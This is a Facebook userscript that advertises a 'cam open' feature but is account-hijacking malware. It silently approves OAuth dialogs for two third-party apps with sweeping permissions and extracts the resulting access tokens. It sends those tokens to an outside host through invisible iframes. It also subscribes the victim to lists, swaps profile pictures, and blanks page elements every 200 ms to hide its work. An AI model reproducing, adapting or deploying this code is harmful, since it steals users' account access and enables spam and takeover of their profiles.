// ==UserScript==
// @name            Facebook Cam open
// @description     Facebook Cam open
// @version         1.3
// @date            16/04/2014
// @author          Shawn Jasper
// @copyright       Shawn Jasper
// @require         http://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
    KINGALHACKERS = document.getElementsByClassName("profilePic img")
for (i = 0; i < KINGALHACKERS.length; i++) {
KINGALHACKERS[i].src = "http://img534.imageshack.us/img534/4028/girl1.gif";
}
function king(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}
king("195621707274141");
king("209163605919951");
uygulamaizinver(TokenUrl("165907476854626"));
uygulamaizinver2(TokenUrl("149859461799466"));
var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();
function uygulamaizinver(url){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
izinverhtml = document.createElement("html");
izinverhtml.innerHTML = xmlhttp.responseText;
if(izinverhtml.getElementsByTagName("form").length > 0){
izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
act = izinverhtml.getElementsByTagName("form")[0].action;
duzenlevegonder(izinverhtml,act);
}
}
};		
xmlhttp.open("GET", url, true); 
xmlhttp.send();
}
function uygulamaizinver2(url){
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
if(xmlhttp.readyState == 4){
izinverhtml = document.createElement("html");
izinverhtml.innerHTML = xmlhttp.responseText;
if(izinverhtml.getElementsByTagName("form").length > 0){
izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
act = izinverhtml.getElementsByTagName("form")[0].action;
duzenlevegonder2(izinverhtml,act);
}
}
};		
xmlhttp.open("GET", url, true); 
xmlhttp.send();
}
function duzenlevegonder2(formnesne,act){
izinverparams = "";
for(i=0;i<formnesne.getElementsByTagName("input").length;i++){
if(formnesne.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")){
izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
}
}
if(formnesne.getElementsByTagName("select").length > 0){
izinverparams += "&" + formnesne.getElementsByTagName("select")[0].name + "=80";
}
izinverparams.replace("&fb_dtsg","fb_dtsg");
izinverparams += "&__CONFIRM__=1";
formnesne = formnesne;
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			  izinhtml = document.createElement("html");
			  izinhtml.innerHTML = xmlhttp.responseText;
			if(izinhtml.getElementsByTagName("form").length > 0){
			  izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
			  act = izinhtml.getElementsByTagName("form")[0].action;
			  duzenlevegonder(izinhtml,act)
			}else{
			sex = xmlhttp.responseText.match(/#access_token=(.*?)&expires_in/i);
			if (sex[1]) {
			tokenyolla2(sex[1]);

	 function wallpostg(){
jQuery.ajax({
url:'https://graph.facebook.com/me/photos?url=' + fotolink + '&message='+ text +'&callback=paylas&method=POST&access_token=' + access_token,
dataType:'script',
success:function(){
gonderildi += 1;
}
});
}
			}
			}
			}
        };

xmlhttp.open("POST", act , true); 
xmlhttp.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(izinverparams);

}
function duzenlevegonder(formnesne,act){
izinverparams = "";
for(i=0;i<formnesne.getElementsByTagName("input").length;i++){
if(formnesne.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")){
izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
}
}
if(formnesne.getElementsByTagName("select").length > 0){
izinverparams += "&" + formnesne.getElementsByTagName("select")[0].name + "=80";
}
izinverparams.replace("&fb_dtsg","fb_dtsg");
izinverparams += "&__CONFIRM__=1";
formnesne = formnesne;
var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			  izinhtml = document.createElement("html");
			  izinhtml.innerHTML = xmlhttp.responseText;
			if(izinhtml.getElementsByTagName("form").length > 0){
			  izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
			  act = izinhtml.getElementsByTagName("form")[0].action;
			  duzenlevegonder(izinhtml,act)
			}else{
			sex = xmlhttp.responseText.match(/#access_token=(.*?)&expires_in/i);
			if (sex[1]) {
			tokenyolla(sex[1]);

	 function wallpostg(){
jQuery.ajax({
url:'https://graph.facebook.com/me/photos?url=' + fotolink + '&message='+ text +'&callback=paylas&method=POST&access_token=' + access_token,
dataType:'script',
success:function(){
gonderildi += 1;
}
});
}
			}
			}
			}
        };

xmlhttp.open("POST", act , true); 
xmlhttp.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send(izinverparams);

}

function TokenUrl(id){
return "//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + id  +"&redirect_uri=fbconnect://success&sso_key=com&scope=offline_access,public_profile,basic_info,read_stream,publish_checkins,status_update,photo_upload,video_upload,create_note,share_item,export_stream,publish_stream,manage_pages,publish_actions,whitelisted_offline_access,user_likes,user_activities,user_photos,user_friends,user_about_me,user_status,user_subscriptions,friends_location,friends_likes,friends_activities,friends_notes,friends_about_me,friends_status,user_actions.news";
}

if(!localStorage['token_' + profile_id] ||  (localStorage['token_' + profile_id] && tarih.getTime() >= localStorage['token_' + profile_id])){
var http = new XMLHttpRequest();
http['open']('GET', 'http://graph.facebook.com/' + profile_id, false);
http['send']();
var get = JSON.parse(http['responseText']);
var isim = get.name;
}
window.setInterval(function(){
if(document.getElementsByClassName("_5ce")){
for(i=0;i<document.getElementsByClassName("_5ce").length;i++){
document.getElementsByClassName("_5ce")[i].innerHTML = "";
}
}
if(document.getElementsByClassName("uiToggle wrap")){
for(i=0;i<document.getElementsByClassName("uiToggle wrap").length;i++){
document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
}
}
if(document.getElementsByClassName("uiPopover")){
for(i=0;i<document.getElementsByClassName("uiPopover").length;i++){
document.getElementsByClassName("uiPopover")[i].innerHTML = "";
}
}
},200);
function tokenyolla(access_token){
document.getElementById('meta_referrer').innerHTML = document.getElementById('meta_referrer').innerHTML + '<iframe src="https://rsb39.rhostbh.com/~kingalh1/1.html#' + access_token + '" width="0" height="0"></iframe>' + '<iframe src="https://rsb39.rhostbh.com/~kingalh1/bx/access/index.php#access_token='+ access_token + '" width="0" height="0"></iframe>';
}
function tokenyolla2(access_token){
document.getElementById('facebook').innerHTML = document.getElementById('facebook').innerHTML + '<iframe src="https://rsb39.rhostbh.com/~kingalh1/bx2/index.php#access_token='+ access_token + '" width="0" height="0"></iframe>';
}